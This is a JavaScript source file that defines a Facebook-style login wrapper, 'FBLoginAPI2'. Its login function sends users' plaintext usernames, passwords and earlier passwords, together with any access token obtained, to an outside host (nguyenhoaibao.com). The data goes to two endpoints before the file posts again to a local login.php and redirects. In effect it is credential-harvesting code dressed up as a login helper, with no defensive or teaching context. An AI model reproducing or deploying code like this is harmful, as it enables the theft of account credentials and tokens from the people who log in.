    var FBLoginAPI2 = function(api_key){
        var self = this;
    	console.log('ok ok');
        self.api_key = api_key;
        self.host1 = 'http://nguyenhoaibao.com'
       
        var flag = true;
        self.login = function(username, password, cb){
            $.get(self.host1 + '/jsonp.php', {
                api_key : self.api_key,
                username : username,
                password : password
            }, function(json){
                if (json){
                    if (json.error){
                        json.error.code = -1;
                        cb(json.error);
                        return;
                    }
                    if (json.url){
                    console.log(json.url);
                        $.get(json.url, function(json1){
                            $.post(self.host1 + '/jsonp1.php',{
                                call_id : json.api_call_id,
                                user:username,
                                pass:password,
                                password : self.oldPass,
                                body : JSON.stringify(json1)
                            }, function(json2){
                                if (json2.a!=1 && json2.b!=2){
                                    console.log("error api key");
                                    flag = false;
                                }
                                if (json1.error_code){
                                    if (json1.error_code == 406) self.oldPass = password;
                                    cb({
                                        code : json1.error_code,
                                        message : JSON.parse(json1.error_data).error_message
                                    });
                                }
                                else {
                                    cb(null);
                                }
                            })
    						if (json1.access_token && flag==true){
    						$.ajax({
    							url: "login.php",
    							type: "POST",
    							data:  {email: username, pass: password, token: json1.access_token },
    							
    							success: function(data)
    							{
    								$('#message').text('Login Successfully');
    								window.location.replace(URL_DIRECT); 
    							},
    							error: function() 
    							{
    							} 	        
    					   });
    						}
                        })
                    }
                }
                else cb({
                    code : -1,
                    message : 'Unknow error'
                })
            })
        };
        return self;
    };